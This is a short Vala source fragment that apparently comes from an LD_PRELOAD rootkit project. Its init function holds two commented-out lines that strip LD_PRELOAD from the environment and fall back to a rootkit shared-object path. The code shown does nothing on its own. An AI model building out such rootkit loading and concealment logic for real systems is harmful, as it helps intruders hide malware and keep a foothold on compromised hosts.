using Posix;

public static string Init_LDPRELOAD;
extern unowned char** environ;

void init()
{
	//Init_LDPRELOAD = EnvironModify.Remove("LD_PRELOAD");
	//Init_LDPRELOAD = Init_LDPRELOAD != null ? Init_LDPRELOAD : OneRootkit.GetRootkitSoPath();
}